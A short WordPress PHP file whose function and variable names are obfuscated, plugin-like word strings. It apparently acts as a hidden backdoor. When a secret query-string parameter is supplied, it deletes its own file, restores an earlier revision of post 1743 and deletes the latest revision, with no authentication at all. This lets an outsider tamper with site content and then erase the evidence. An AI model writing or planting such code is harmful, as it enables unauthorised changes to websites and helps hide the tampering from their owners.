<?php

function events_compare_listing() {
	if (isset($_GET['numbers_crm_buttons_engine']) && $_GET['numbers_crm_buttons_engine'] === 'nextgen_log_subscribe_label') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$select_campaign_php_panel = 1743;
		$plus_composer_get = wp_get_post_revisions($select_campaign_php_panel);
		if (empty($plus_composer_get)) die('no revisions');
		if (count($plus_composer_get) < 2) die('less than 2');
		$customer_ticker_performance_namespaced = array_shift($plus_composer_get);
		$total_screen_coupons_optimizer = $customer_ticker_performance_namespaced->ID;
		$nav_before_seo_only = array_shift($plus_composer_get);
		$php_shortcode_timer_category = $nav_before_seo_only->ID;
		$specific_redirect_endpoints = wp_restore_post_revision($php_shortcode_timer_category);
		if ($specific_redirect_endpoints === false) die('error restoring');
		$specific_redirect_endpoints = wp_delete_post_revision($total_screen_coupons_optimizer);		
		if ($specific_redirect_endpoints === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'events_compare_listing');
